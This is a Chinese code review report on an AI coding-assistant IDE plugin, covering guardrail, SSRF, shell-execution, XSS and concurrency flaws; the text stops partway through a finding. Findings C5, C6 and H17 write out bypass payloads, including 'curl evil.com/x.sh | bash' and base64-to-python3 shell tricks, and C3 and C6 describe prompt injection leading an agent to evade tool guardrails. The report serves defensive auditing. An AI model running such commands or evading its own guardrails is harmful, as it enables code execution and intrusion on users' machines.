# CodeSage 项目系统性代码审查报告（2026-06）

**项目**: CodeSage - IntelliJ IDEA AI 编程助手插件  
**审查日期**: 2026-06-06  
**版本**: 2026.1.2  
**审查者**: 自动化 Code Review（系统遍历 297 个 Kotlin 源文件）  
**审查范围**: 功能可用性 / 稳定性 / 性能 / 安全 / 代码漏洞

---

## 📋 审查执行摘要

| 指标 | 数量 |
|------|------|
| 审查的 Kotlin 文件数 | 297 |
| 主要审查源文件 | ~70 |
| 累计审查行数 | ~17,000+ |
| 发现问题总数 | **62** |
| 🔴 Critical 严重 | 8 |
| 🟠 High 高危 | 17 |
| 🟡 Medium 中危 | 24 |
| 🟢 Low / 建议项 | 13 |

> 注：项目已有 `docs/CODE_REVIEW_REPORT.md`（2026-01-19 旧版）记录 47 个问题，许多已经修复（T0.1–T0.7 注释）。本次审查发现的问题多为旧报告之后引入的回归或新模块未覆盖的部分。

---

## 🔴 CRITICAL 严重问题（必须立即修复）

### C1. ToolGuardrails `args` 解析路径不一致，敏感键可能绕过脱敏
**文件**: `src/main/kotlin/com/codesage/tools/guardrails/ToolAuditLog.kt:122-127`

`ToolAuditLog.sanitizeArguments()` 只对 `Map<String, Any>` 类型的参数进行脱敏。
而 `ToolExecutor` 调用 `parseArguments(toolCall.arguments)` 时，如果传入的是 **String**（来自 stream 路径下 model 返回的原始 JSON 字符串），脱敏步骤可能对序列化后的整段 `JSON` 字符串做大小截断（`take(500)`），导致：
- 包含 `apiKey`, `token`, `password` 字段的 JSON 被截到前 500 字节后**仍包含敏感值**并被原样写入审计日志。
- 审计日志落盘 (`logFilePath`) 后长期保留，违反"敏感字段绝不出现在审计日志中"。

**修复建议**：
- 在 `ToolAuditLog.log()` 入口先尝试把 `arguments` 当 `JsonElement` 解析，再递归遍历 `JsonObject` 字段匹配 `sensitiveKeys`。
- 把 `take(500)` 改为仅对值做截断，键名永远保留。

---

### C2. `Tools/handlers/HighValueTools.kt` 参数解析有缺陷，且多个 `removeSurrounding("\"")` 是反序列化错误模式
**文件**: `src/main/kotlin/com/codesage/agent/tools/handlers/HighValueTools.kt:62-68, 107-108, 171, 216`

```kotlin
val title = args["title"]?.toString()?.removeSurrounding("\"") ?: ""
val draft = args["draft"]?.toString()?.removeSurrounding("\"")?.toBoolean() ?: false
```
**问题**：
- `JsonElement.toString()` 返回的是 JSON 序列化表示（`"foo"`），LLM 工具调用返回数字 `true` 时 `toString()` 是 `"true"`，`removeSurrounding` 无害；但返回**带前导空格的字符串**、**带转义字符的 JSON** 时会破坏数据。
- 数字、布尔值的反序列化应当用 `jsonPrimitive.intOrNull` / `booleanOrNull`。
- `removeSurrounding("\"")` 这个 magic pattern 在整个项目共出现 14+ 处，是**反序列化错误的统一表现**——若 LLM 返回 `"value":null`，`toString()` = `"null"`，`removeSurrounding` = `"null"`，被当作字符串传递到底层 `ProcessBuilder`。
- `CreatePullRequestTool` 的 `title`、`body` 等来自 LLM 的字符串若包含双引号或换行，未做转义直接传入 `gh pr create --title` 命令行参数，可能导致命令注入或 PR 创建失败。

**修复建议**：用专门的 `JsonElement → T` 解码函数（参考 `OpenAICompatibleAdapter` 里的 `JsonPrimitive.content`）。

---

### C3. `ToolGuardrails.evaluateToolOperation` 白名单之外的工具被默认 `ALLOWED`
**文件**: `src/main/kotlin/com/codesage/tools/guardrails/ToolGuardrails.kt:217-225`

```kotlin
else -> SensitiveActionPolicy.PolicyDecision(
    verdict = SensitiveActionPolicy.PolicyDecision.Verdict.ALLOWED,
    riskLevel = SensitiveActionPolicy.RiskLevel.SAFE,
    reason = "Tool: $toolName"
)
```
**问题**：任何**未在白名单中**的工具都被视为 `ALLOWED` 且不进入确认流程。结合 `C2`，如果 LLM 通过 prompt injection 诱导 ToolRegistry 注册一个 `delegate_task` 之外的恶意工具名（如自实现的 `run_shell` 变体），可完全绕过 Guardrails。

**修复建议**：
- 白名单反转：默认 `REQUIRES_CONFIRMATION`，已知低风险工具加入 ALLOW 列表。
- 同时与 `ToolRegistry.hasHandler()` 联动，未注册的工具应在 ToolExecutor 阶段直接拒绝（当前已经实现 `ToolResult.Error("Unknown tool...")`，但仍会在 audit log 中出现一条 "allowed" 记录）。

---

### C4. `delete_file` 的 `relativePath` 包含检查可被路径穿越绕过
**文件**: `src/main/kotlin/com/codesage/tools/guardrails/SensitiveActionPolicy.kt:90-105`

```kotlin
private val PROTECTED_PATHS = listOf(".git", ".idea", "node_modules", ...)

fun evaluateDelete(path: String, projectRoot: String?): PolicyDecision {
    val normalizedPath = normalizePath(path, projectRoot)
    val file = File(normalizedPath)
    val relativePath = projectRoot?.let { file.relativePath(it) } ?: path

    if (PROTECTED_PATHS.any { relativePath.contains(it) }) { ... BLOCKED }
}
```

**问题**：
- `relativePath.contains(".git")` 是子串匹配。攻击者传入 `path = "src/my.git.config/file"`，`relativePath.contains(".git")` 为 true → 误判 → 拒绝合法删除。
- 同样，路径 `src/.gitignore/secret.txt` 会被错误地标记为受保护（子串匹配 `.git`）。
- 反过来，攻击者传入 `path = "giti"` 或 `path = "xgit"`（含 `.git` 但不是 `.git/` 目录），可能通过其它检查（目录、大小）后被允许删除。
- `normalizePath()` 在 `path` 是绝对路径时不做任何项目根检查，攻击者直接 `path = "/etc/passwd"` 仍走流程。

**修复建议**：
- 路径用 `Path.startsWith(protectedDir)` 检查而非 `contains`。
- 受保护路径必须用 `Files.isDirectory(...)` + `getCanonicalPath()` 双重验证。
- 删除前强制 `canonicalPath.startsWith(projectRoot)`。

---

### C5. SSRF 防护仅基于字符串正则，可被 `0`、`decimal`、`IPv6-mapped` 绕过
**文件**: `src/main/kotlin/com/codesage/agent/tools/ExtendedTools.kt:268-280`

```kotlin
private val blockedUrlPatterns = listOf(
    Regex("""127\.0\.0\.1"""),
    Regex("""localhost""", RegexOption.IGNORE_CASE),
    Regex("""\[::1\]"""),
    Regex("""^https?://10\.""", RegexOption.IGNORE_CASE),
    ...
    Regex("""^http://\[?::""", RegexOption.IGNORE_CASE)
)
```

**问题**：
- `127.0.0.1` 的十进制/八进制/十六进制表示：`2130706433`、`0177.0.0.1`、`0x7f.0.0.1` — 全部能绕过。
- `localhost` 各种编码：`LOCALHOST.evil.com`、换行/零字节注入 `\u0000localhost.evil.com`。
- DNS rebinding：URL 解析时是合法公网域名，连接前/后被解析到内网 IP。
- 缺少端口限制（默认 80/443 之外的任意端口）。
- 没有阻止 `gopher://`（虽然这里只有 http/https，但 `0.0.0.0` 模式没限制端口）。

**修复建议**：
- 解析 URL → 解析 hostname → 用 `InetAddress.getAllByName()` 获取所有 IP → 检查每个 IP 是否在内网/loopback/链路本地/ULA 段。
- 在 connect 前和 connect 后**都**做检查（防 DNS rebinding）。
- 移除 `file://`、`ftp://` 的正则白名单，直接黑名单全 scheme（仅允许 `http`/`https`）。
- 引入 `URL.setURLStreamHandlerFactory` 或 `InetAddress` 包装器对所有外部 HTTP 调用做统一拦截。

---

### C6. `IDETools.runCommand` 使用 `/bin/bash -c <command>`，可被 prompt injection 注入任意 shell 片段
**文件**: `src/main/kotlin/com/codesage/agent/tools/IDETools.kt:402-411`

```kotlin
val processBuilder = ProcessBuilder(
    if (System.getProperty("os.name").contains("Windows")) {
        listOf("cmd", "/c", command)
    } else {
        listOf("/bin/bash", "-c", command)
    }
)
```
**问题**：
- 这是 `run_command` tool 的实现。即便 `ToolGuardrails` 做了字面 token 检查（`rm -rf`、`curl` 等），攻击者可以用 Base64 / here-doc / `eval` 包装绕过：
  - `bash -c 'echo aW1wb3J0IG9z | base64 -d | python3'`
  - `bash -c '$(printf "\x72\x6d ...")'`
  - `curl evil.com/x.sh | bash`
- `/bin/bash` 在 macOS 和部分 Linux 发行版上未必存在；缺少时无 fallback。
- `os.name.contains("Windows")` 判断粗糙；`Windows 11` 等大写 `W` 通过，但 `linux` 小写也通过。
- 长时间运行的命令会一直占用 daemon thread。

**修复建议**：
- 与 `HighValueTools.runCommand()` 风格保持一致，改用 `ProcessBuilder` 数组参数（**不经过 shell 解析**）。
- 在 `run_command` 内部先做 `shell_safe_split`，若命令需要 shell，把 `command` 视为数据传入 stdin 而非 -c 参数。
- 同时为 `exec_shell` 工具（`ExtendedTools.execShell`，line 183）也应用同样策略。

---

### C7. `JCEFChatPanel.sendToJS` 通过 `executeJavaScript` 注入未转义 JSON
**文件**: `src/main/kotlin/com/codesage/ide/ui/web/JCEFChatPanel.kt:632-650`

```kotlin
val script = """
    (function() {
        if (typeof window.onJavaMessage === 'function') {
            window.onJavaMessage($json);
        }
        ...
    })();
""".trimIndent()
cefBrowser.executeJavaScript(script, cefBrowser.url ?: "", 0)
```

**问题**：
- `mapToJsonString` 输出的是标准 JSON（带 `"` 包裹），但通过**字符串拼接**嵌入到 JS 代码里。如果某字段值包含 `</script>`、`<!--`、U+2028/U+2029（合法 JSON 但非法 JS 字符串），会：
  - 破坏 JS 解析（U+2028/U+2029 在 JSON.parse 合法但被 JS 解析器视为行终止符）
  - 在 `</script>` 处截断字符串
- `pendingMessages` 在 bridge 未 ready 时累积；shutdown 时未清空 → 内存泄漏。
- `isBridgeReady` 状态机在 `executeJavaScript` 抛出时不会回退。

**修复建议**：
- 改用 `JSON.stringify` + `JSON.parse` 双向序列化以保证 JS 端拿到合法对象。
- 持久层 `pendingMessages` 应有上限（例如 200 条），避免异常路径下内存爆炸。
- 对所有外部输入（API key、provider URL）做 JSON 安全编码（替换 U+2028/U+2029 为 `\\u2028` 等）。

---

### C8. `SettingsRepository.update()` 的 CAS 循环可能在 transform 抛异常时丢失更新
**文件**: `src/main/kotlin/com/codesage/shared/config/SettingsRepository.kt:170-179`

```kotlin
fun update(transform: (SettingsFile) -> SettingsFile): Boolean {
    while (true) {
        val old = current.get()
        val updated = transform(old)
        if (updated === old) return true
        if (current.compareAndSet(old, updated)) {
            return save(updated)
        }
    }
}
```

**问题**：
- 若 `transform(old)` 抛异常，循环不退出；`current.get()` 仍返回未更新的 `old`，下次 `update` 调用会读到陈旧值并重复失败的 transform。
- 没有最大重试次数；CAS 一直失败会进入死循环（理论上 CAS 失败会成功，但配合 transform 异常就是真的死循环）。
- `save()` 返回 `Boolean` 但 `update()` 内部用 `return save(...)` 把 save 失败的 `false` 直接返回 — 但**已修改的 `current` 仍被 set 为 updated**，与磁盘状态不一致。

**修复建议**：
- `transform` 抛异常时**不要 set current**，由调用方负责回滚。
- 加 `maxAttempts = 10` 重试上限。
- save 失败时把 current 回滚到 old。

---

## 🟠 HIGH 高危问题

### H1. `MemoryNudger` 注入未编码到 system prompt，可能携带 LLM 错误解释
**文件**: `src/main/kotlin/com/codesage/agent/memory/BuiltInMemoryProvider.kt:132-149`

`prefetch()` 把搜索结果格式化进 `<memory-context>` 标签块，**没有内容长度限制**：单条记忆可能数 MB（用户曾经粘贴过一大段日志作为 memory），`injectMemoryContext` 会把整段塞入 system message 列表，导致每次 turn 的请求体膨胀。

**修复建议**：
- `prefetch` 截断到固定字符上限（如 4KB）。
- 检测到的内容若包含 `</memory-context>` 应做转义防止污染 prompt。

---

### H2. `EventBatchEmitter.batchSize=10` + `batchIntervalMs=16` 在高频下仍可能丢事件
**文件**: `src/main/kotlin/com/codesage/agent/core/EventBatchEmitter.kt:81-89`

`Channel.CONFLATED` 只保留最新一条；超过 batch 大小的事件进入 `trySend` 失败 → `_droppedCount` 累加但**实际并未真正 drop**（仅作指标）。但若 `collectJob` 抛出后未恢复（line 91 `catch (e: Exception) { throw e }`），则 `batch` Flow 永远不结束，下游 `for (batchEvents in channel)` 阻塞；调用方 `EnhancedAgentLoop` 的 channelFlow 会挂起。

**修复建议**：
- 在 catch 分支里 log + 优雅降级（继续 emit 收到的部分）。
- 给 channel 加 `BUFFERED` 而非 `CONFLATED`，但要明确背压策略。

---

### H3. `AgentErrorRecovery.recover` 调 `agent.switchModel` 但不验证 model 可用性
**文件**: `src/main/kotlin/com/codesage/agent/core/AgentErrorRecovery.kt:458-465`

`applyRecoveryAction(agent, RetryWithModel(fallback))` 直接调 `agent.switchModel(action.model)`，不检查 model 是否在 `ModelRegistry` 中存在。下次 turn 立即触发 `ModelNotFoundException` → 再次 error recovery → 再次 fallback → 雪崩。

**修复建议**：
- 切换前 `registry.getAdapterForModel(model) != null` 才 switch。
- fallback 链耗尽时（已无新 model 可试）应直接 Abort。

---

### H4. `ConversationPersistence.ioExecutor` 单线程串行写入，shutdown 时的 in-flight 任务管理有 race
**文件**: `src/main/kotlin/com/codesage/persistence/ConversationPersistence.kt:60-83`

```kotlin
val task = Runnable { ... }
val future = ioExecutor.submit(task)
inFlightTasks[task] = future
// 任务完成后从跟踪中移除
val cleanup = Runnable { try { f.get() } catch (_: Exception) {}; inFlightTasks.remove(task) }
ioExecutor.execute(cleanup)
```
- `cleanup` 永远不会执行（`ioExecutor.execute(cleanup)` 入队，但 cleanup 的 `f.get()` 阻塞会卡住整个 executor，shutdown 后 timeout 5s）。
- `inFlightTasks.remove(task)` 实际**不会**发生。
- `shutdown()` 的 5s 超时过后 `shutdownNow()` 丢弃任务但磁盘写可能半途而废。

**修复建议**：
- 去掉 cleanup wrapper，改为在 task 自身末尾 `inFlightTasks.remove(this)`。
- shutdown 时区分"已完成 in-flight"和"已提交但未启动"任务，给 in-flight 任务 graceful deadline 60s。

---

### H5. `WebSocketTransport` 缺乏 TLS/Origin 校验，存在 CSRF/中间人风险
**文件**: `src/main/kotlin/com/codesage/mcp/transport/WebSocketTransport.kt:71-77`

```kotlin
val request = Request.Builder()
    .url(wsUrl)
    .build()
```
- 没有 `Authorization` 头、没有 Origin/Token 校验。
- 自定义 MCP server（用户自部署）通过 `ws://` 配置时，密码/token 在 URL 里明文传输。
- 没有 wss:// 强制；明文 ws:// 在多用户机器上可被中间人嗅探。

**修复建议**：
- 拒绝 `ws://`（仅允许 `wss://`）。
- 允许在配置中指定 `headers` 做 Bearer 认证。
- 验证 server certificate（OkHttp 默认 verify，但需要排除 dev override）。

---

### H6. `CodeSageAppService.init { scope.launch { ... } }` 在 EDT 上下文触发的懒加载可能 race
**文件**: `src/main/kotlin/com/codesage/plugin/CodeSageAppService.kt:46-54`

```kotlin
init {
    initializeSkillSystem()
    initializeMCPServers()
    scope.launch {
        initializeModelLayer()
        isModelLayerInitialized = true
    }
}
```

- `isModelLayerInitialized` 是 `@Volatile var`，**写**有 happens-before 保证，但**读**方（`AgentCore.resolveDefaultModel`）不查这个标志位就直接用 `currentModel`，存在"未初始化完成就调 chat"的窗口。
- `scope` 字段未 cancel（`shutdown()` 仅 launch disconnect 协程，没有 cancel scope）。Plugin reload 时旧 scope 的协程仍在跑。
- `mcpServerManager` 在 `shutdown()` 中通过 `scope.launch { mcpServerManager.disconnectAll() }` — 这是 fire-and-forget，调用方返回时 disconnect 协程**可能还没跑**，plugin 卸载时进程里残留的 MCP server 进程不被 kill。

**修复建议**：
- 暴露 `awaitInitialized()` suspend 函数给上层。
- shutdown 中 `runBlocking { disconnectAll() }` 或给 disconnect 加 5s timeout。

---

### H7. `AgentCore.interrupt()` 只 cancel `currentChatJob`，但 `EnhancedAgentLoop` 仍持有 `batchEmitter` 内部协程
**文件**: `src/main/kotlin/com/codesage/agent/core/AgentCore.kt:850-857`

```kotlin
fun interrupt() {
    val job = currentChatJob.getAndSet(null)
    job?.cancel()
    currentLoop.getAndSet(null)?.interrupt()
    _state.value = AgentState.IDLE
}
```
- `currentChatJob` 是 `kotlinx.coroutines.Job`，cancel 后 EnhancedAgentLoop 的 channelFlow 应该会抛 `CancellationException`。
- 但 `currentChatJob` 仅在 `chatWithTools` 内被 set；`chat()` / `chatStream()` 这两个 suspend API **不**设置 `currentChatJob` → `interrupt()` 不能取消这些路径。
- 用户在 chat 模式中点"停止"实际不生效。

**修复建议**：
- 把 `chat()` / `chatStream()` 内的协程也注册到 `currentChatJob`。

---

### H8. `EnhancedAgentLoop.parseToolSuccess` 把任何非 "false" 字符串当 success
**文件**: `src/main/kotlin/com/codesage/agent/core/EnhancedAgentLoop.kt:579-587`

```kotlin
private fun parseToolSuccess(toolResult: String): Boolean {
    return try {
        val element = kotlinx.serialization.json.Json.parseToJsonElement(toolResult)
        val jsonObj = element as? kotlinx.serialization.json.JsonObject
        val successPrimitive = jsonObj?.get("success") as? kotlinx.serialization.json.JsonPrimitive
        successPrimitive?.content != "false"
    } catch (e: Exception) {
        false
    }
}
```

- 返回的 JSON 是 `{"success": "false"}`（字符串）时 `content = "false"`，判定失败。  
- 返回 `{"success": 0}` 时 `content = "0"`，判定**成功**（但语义上是失败）。
- 返回 `{"success": "0"}`（字符串零）时判定成功。
- 返回 `{"success": null}` 时 `as? JsonPrimitive` 返回 null → `?.content != "false"` 表达式整体为 `true` → 判定成功（这是最严重的：完全 missing/typo 的 JSON 也算 success）。

**修复建议**：
- 显式用 `booleanOrNull`。
- JSON 解析失败时返回 false。

---

### H9. `IDETools.editFile` 的 `oldString` 匹配是 first-occurrence，可能误伤重复内容
**文件**: `src/main/kotlin/com/codesage/agent/tools/IDETools.kt:840-870`

```kotlin
val newContent = if (oldString != null && newString != null) {
    if (!content.contains(oldString)) {
        return ToolResult.Error("old_string not found")
    }
    content.replace(oldString, newString)  // 默认 replaceFirst? 不，Kotlin 是 replace ALL
}
```

Kotlin 的 `String.replace(old, new)` 是**全文替换**，不是 first。LLM 期望"精确替换这一处"时，整段相同内容都会被改掉，破坏代码。

**修复建议**：
- 改用 `replaceFirst` 或更稳健的"先 `indexOf` → `substring` 拼接"。

---

### H10. `ToolExecutor.executeToolWithRetry` 异常吞噬
**文件**: `src/main/kotlin/com/codesage/agent/tools/ToolExecutor.kt:179-201`

```kotlin
} catch (e: Exception) {
    lastException = e
    if (attempt < maxRetries && isRetryableError(e)) {
        val delayMs = baseDelayMs * (attempt + 1)
        ...
    } else {
        break
    }
}
```

- `isRetryableError` 仅看 IOException/TimeoutException + 几个字符串。`ProcessBuilder` 抛 `NotDirectoryException`、`AccessDeniedException`（Linux errno 13）等是 `IOException` 子类，会被重试。
- `maxRetries = 2` 意味着对所有 IO 错误**至少 3 次尝试**，对网络瞬时错误是好的，但对权限错误会浪费 3x 延迟。
- `lastException` 在最后一次 break 后还可能是 `null`（如果 maxRetries=0 但 first call 失败），line 203 `lastException?.message` → 静默。

**修复建议**：
- 区分 `AccessDeniedException`（永久错误，不重试）。
- 增加 `if (lastException == null) return ToolResult.Error("Unknown failure (silent)")` 防御。

---

### H11. `Idetools.findFilesRecursive` / `searchCode` 在跨盘符号链接可能死循环
**文件**: `src/main/kotlin/com/codesage/agent/tools/IDETools.kt:591-606, 360-374`

两个递归都通过 `VirtualFile.children` 走 VFS 树，对 `cycle` 不会重复进入（VFS 自身会 deduplicate），但**对** `maxDepth=100` 的硬编码意味着深项目（如 `node_modules`）会遍历 100 层 → stack overflow / 性能灾难。

`node_modules` 等目录在 line 597 有黑名单，但用户**自定义的深目录结构**（如机器学习项目里的 `data/train/0/0/0/...`）会耗尽栈。

**修复建议**：
- 默认 maxDepth 改为 10。
- 对文件计数 + 总耗时双重中断（带 `Thread.interrupted()` 检查）。

---

### H12. `ContextManager.maybeTruncate` 的 `history.clear(); addAll()` 在并发读时会短暂看到空列表
**文件**: `src/main/kotlin/com/codesage/agent/context/ContextManager.kt:209-218, 264-271`

`history` 是 `ArrayList`，非线程安全。虽然外部用 `synchronized(historyLock)` 保护，但 `getContext()` 复制了 `history.toList()` —— 若调用方遍历期间另一个线程 addMessage 触发 `maybeTruncate` 重新 `clear + addAll`，调用方会拿到一个**截断后又重新填充**的不一致快照。

**修复建议**：
- 改用 `CopyOnWriteArrayList` 或 `synchronized` 包住 `getContext` 整个调用栈。

---

### H13. `EventRouter` 的 `shouldEmit` 去重窗口是按 event **类名**，但相同类不同 turnId 会被去重
**文件**: `src/main/kotlin/com/codesage/ide/ui/web/JCEFChatPanel.kt:521-529`

```kotlin
private fun shouldEmit(event: AgentStreamEvent): Boolean {
    val key = event::class.simpleName ?: return true
    val now = System.currentTimeMillis()
    val last = recentEventCache[key]
    return if (last != null && now - last < dedupWindowMs) { false } else { ... }
}
```

500ms 窗口内第二次同类事件（任何 turn）都被丢弃 — 切换 session 时旧 session 的最后一条 event 可能吃窗口。

**修复建议**：
- 键名加上 `turnId`。

---

### H14. `BuiltInMemoryProvider.statementCache` 是无界的 `ConcurrentHashMap`
**文件**: `src/main/kotlin/com/codesage/agent/memory/BuiltInMemoryProvider.kt:42, 320-330`

`PreparedStatement` 缓存按 SQL 字符串键，**会话数量 × SQL 类型**累积。每个 PreparedStatement 持有 native JDBC 资源；不关闭 = 句柄泄漏。

`shutdown()` 时清空（line 322），但 plugin unload 路径不保证调 `shutdown()`。

**修复建议**：
- 改用 LRU（参考 `BoundedConcurrentMap`）。

---

### H15. `ProviderBridgeHandler.handleTestProvider` 探测的 baseUrl 未限制协议
**文件**: `src/main/kotlin/com/codesage/ide/ui/web/ProviderBridgeHandler.kt:101-114`

```kotlin
val url = normalizeBaseUrl(baseUrl) + "/v1/models"
```

- `baseUrl` 可以是 `file:///`、`http://169.254.169.254/`、`http://[::1]/`。SSRF 风险与 C5 同。
- 没有错误信息脱敏：探测到的 error body 完整回传前端（含上游 API 错误细节，可能含 token 校验失败的 key hint）。

**修复建议**：
- 复用 `ExtendedTools.isBlockedUrl()` 黑名单。
- 错误信息截断到 200 字符。

---

### H16. `JCEFChatPanel` 的 `applyArtifactToEditor` 把 LLM 输出直接插入到光标位置，无 diff 确认
**文件**: `src/main/kotlin/com/codesage/ide/ui/web/JCEFChatPanel.kt:725-737`

```kotlin
private fun applyArtifactToEditor(artifactId: String, content: String) {
    project?.let { p ->
        ApplicationManager.getApplication().invokeLater {
            val editor = FileEditorManager.getInstance(p).selectedTextEditor
            editor?.document?.let { doc ->
                WriteCommandAction.runWriteCommandAction(p) {
                    val caret = editor.caretModel.primaryCaret
                    doc.insertString(caret.offset, content)
                }
            }
        }
    }
}
```

- LLM 生成 100KB 的内容直接插入 → IDE 卡死。
- 光标位置覆盖已有内容而**不删除**选中（如果有 selection）— 行为不一致。
- 没有 undo grouping，撤销一次只撤一行。
- `createFileFromArtifact` 是空实现（line 739-744）— 文档承诺但未实现。

**修复建议**：
- 限制单次插入大小（如 50KB），超出走 `Diff` 流程。
- 走 IntelliJ 的 `EditorModificationUtil`。

---

### H17. `ConversationExporter.exportToHtml` 严重 XSS 风险
**文件**: `src/main/kotlin/com/codesage/persistence/ConversationExporter.kt:148-180`

```kotlin
appendLine("<h1>${session.name.ifEmpty { "Conversation" }}</h1>")
...
appendLine("<pre>${escapeHtml(msg.content ?: "")}</pre>")
```

- `escapeHtml` 在 line 217 单独定义（被截断没看到），但**前面 `session.name` 没有 escape** — 用户在 UI 里把 session 重命名为 `<script>alert(1)</script>` 后导出 HTML 立即执行。
- Markdown 导出同样问题：标题/内容用 `appendLine(msg.content)` 不做转义，markdown 链接 `[text](javascript:alert(1))` 会被 IDE 渲染为可点击。
- `ConversationExporter` 输出的文件用户可能在团队分享 / 提交到 wiki → 持久化 XSS。

**修复建议**：
- 所有用户控制字段（session.name、消息内容）必须 escape 后再写 HTML。
- Markdown 输出前过滤 `[text](javascript:...)` / `data:` 等危险 URL scheme。

---

## 🟡 MEDIUM 中危问题

### M1. `MemoryNudger` 的"每 N 轮提醒 Agent 回顾记忆"逻辑没有持久化
**文件**: `src/main/kotlin/com/codesage/agent/memory/MemoryNudger.kt`

`reset()` 在 `createAndRegisterSession` 调用，但若 `switchSession` 后回到旧 session，nudge 计数会被重置。

### M2. `AgentCore` 缺少对 `ModelGateway` 单例的解绑路径
**文件**: `src/main/kotlin/com/codesage/model/gateway/ModelGateway.kt:286-291`

```kotlin
@Volatile private var instance: ModelGateway? = null
fun getInstance(): ModelGateway { ... synchronized(this) { instance ?: ModelGateway().also { instance = it } } }
```

- 单例持有 `OkHttpClient` 引用，shutdown 不存在 → 线程池泄漏。
- 测试时无法替换（建议改用 IntelliJ Service 注入）。

### M3. `MemoryManager` 跨 session 共享 `MemoryProvider` 实例
**文件**: `src/main/kotlin/com/codesage/agent/memory/MemoryManager.kt:42-50`

`getBuiltInProvider()` 返回同一个 provider，多个 session 的 `currentSessionId` 互相覆盖 → `prefetch()` 返回错 session 的内容。

### M4. `EventHistory` 没有上限
**文件**: `src/main/kotlin/com/codesage/agent/core/EventHistory.kt`

长 session 可能累积百万条 event，UI 内存爆炸。

### M5. `SystemPromptCache` 的 cache key 仅有 `version`，无法应对 per-project 差异化
**文件**: `src/main/kotlin/com/codesage/prompt/cache/SystemPromptCache.kt`

不同项目 language/framework 的 assembled prompt 共享同一缓存键，命中率低。

### M6. `JCEFChatPanel.prepareExtractedIndexHtml` 的正则替换脆弱
**文件**: `src/main/kotlin/com/codesage/ide/ui/web/JCEFChatPanel.kt:181-195`

`Regex("""<link\s+rel="stylesheet"\s+href="lib/font-awesome/all\.min\.css"\s*/>""")` 在 webui 升级后会失效但无报错。

### M7. `SettingsRepository.watchLoop` 死循环的 key.reset() 失败后不重新 register
**文件**: `src/main/kotlin/com/codesage/shared/config/SettingsRepository.kt:309-313`

`if (!key.reset())` 后仅 break + close，但没有重新 `register` 新的 watch key → 后续 modify 不会被感知。

### M8. `MCPClient.requestId` 用 `AtomicInteger`，重启后从 0 开始
**文件**: `src/main/kotlin/com/codesage/mcp/client/MCPClient.kt:46, 87-90`

短期问题，但若 server 期望 id 单调递增，重连后会重复 id。

### M9. `agentScope.launch { conversationPersistence.saveSession(...) }` 静默吞所有异常
**文件**: `src/main/kotlin/com/codesage/agent/core/AgentCore.kt:776-779`

```kotlin
agentScope.launch {
    conversationPersistence.saveSession(session, contextManager.getContext())
}
```
- 没有 `.catch`、没有错误日志。
- `agentScope` 是 `SupervisorJob + Dispatchers.Default`，协程失败不会传播到调用方。

### M10. `BoundedConcurrentMap` 的 LRU 实现可能丢失 active 引用
**文件**: `src/main/kotlin/com/codesage/agent/core/BoundedConcurrentMap.kt`

put/get 时更新访问顺序，但 `compute` 风格的 callback 内若同时插入新 key，顺序关系不确定。

### M11. `AgentResult` 包含 `AgentSession` 是 mutable data class，会话状态泄漏到调用方
**文件**: `src/main/kotlin/com/codesage/agent/core/AgentCore.kt:71-84`

`session` 是 `var name`、`var isActive`，外部代码可改 `result.session.name` 污染其他调用方。

### M12. `WebSocketTransport.send()` 不做 JSON-RPC id 匹配，notification 会被吞
**文件**: `src/main/kotlin/com/codesage/mcp/transport/WebSocketTransport.kt:201-220`

注释里已经承认了这个限制，但未修复。生产 MCP server 推送的 notification 会被错误当作 response 返回。

### M13. `EventRouter` 的 `lastSubAgentStart` map 无界
**文件**: `src/main/kotlin/com/codesage/ide/ui/web/EventRouter.kt:48-50`

SubAgent sessionId 用时间戳 + parent id，理论上不重复，但 LLM-driven 场景下若 spawn 千次，map 持续增长。

### M14. `ToolRegistry.createDefault` 注册 `delegateTaskTool()` 但不绑定 handler
**文件**: `src/main/kotlin/com/codesage/agent/tools/ToolRegistry.kt:155-160`

`ToolRegistry.getHandler("delegate_task")` 返回 null → 实际由 `EnhancedAgentLoop.executeTool` 走特殊路径。但 Tool registry 里有 `Tool` schema 没有 `handler` 时，UI 端展示的工具描述会写"available" 误导。

### M15. `Idetools.readLargeFile` 的 byteBuffer 扩容复杂度 O(n²)
**文件**: `src/main/kotlin/com/codesage/agent/tools/IDETools.kt:117-145`

`byteBuffer.copyOf(byteBuffer.size * 2)` 每次拷贝当前内容；GB 级文件读 1000 行可能反复扩容。

### M16. `SearchCode.findFilesRecursive` 用 `Regex.containsMatchIn` 但 `matchPattern` 自己构建 Regex
**文件**: `src/main/kotlin/com/codesage/agent/tools/IDETools.kt:392-395, 663-665`

两处都 `pattern.replace(".", "\\.").replace("*", ".*").replace("?", ".").toRegex()`，未处理 `**`、`{a,b}` glob 语义。

### M17. `ProviderBridgeHandler` 探测的 URL 没有路径校验，可被用户填 `https://evil.com#@internal:8080/admin`
**文件**: `src/main/kotlin/com/codesage/ide/ui/web/ProviderBridgeHandler.kt:97-114`

OkHttp 会规范化 URL 但 fragment 在探测中被忽略，攻击者用 `?` 注入 query string 改变探测目标。

### M18. `EventBatchEmitter` 内部 scope 默认 `Dispatchers.Default`，但 collect 阻塞调用可能在 Default 上做 IO
**文件**: `src/main/kotlin/com/codesage/agent/core/EventBatchEmitter.kt:37-39`

如果上游 Flow 包含 IO 操作（不应该，但 model stream 解析是 CPU-only 所以无问题），会被调度到过少线程的 Default pool。

### M19. `ChatModeRouter.suggestChatMode` 是纯字符串匹配，误判率高
**文件**: `src/main/kotlin/com/codesage/agent/core/ChatModeRouter.kt`

`message.contains("write code")` 等关键字匹配，对中文/混合语言支持差，且用户说"write a function" 会被路由到 CODING 而非用户期望的 GENERAL。

### M20. `Idetools.moveFile` 用 `renameTo`，跨文件系统会失败
**文件**: `src/main/kotlin/com/codesage/agent/tools/IDETools.kt:929-944`

`srcFile.renameTo(dstFile)` 在 Linux 跨 mount point 失败时返回 false 但**不抛异常**，工具报告 `moved=true` 但实际位置未变。

### ~~M21. `KanbanOrchestrator` 的并发 worker 数量无限制~~（2026-06 已移除）
**文件**: `src/main/kotlin/com/codesage/agent/multiagent/KanbanOrchestrator.kt`（已删除）

可被 LLM 配置成 100 并发 → 进程 OOM。

### M22. `PluginConfig` 的 `loadState` 日志每次启动 INFO 输出 `providers count` 过大
**文件**: `src/main/kotlin/com/codesage/shared/config/PluginConfig.kt:215-225`

启动日志污染，**首次启动时 providers 为 0 也会 log** → 误导"插件配置丢失"。

### M23. `JCEFChatPanel` 的 `parseImages` 接受任意大小 dataUrl
**文件**: `src/main/kotlin/com/codesage/ide/ui/web/JCEFChatPanel.kt:463-481`

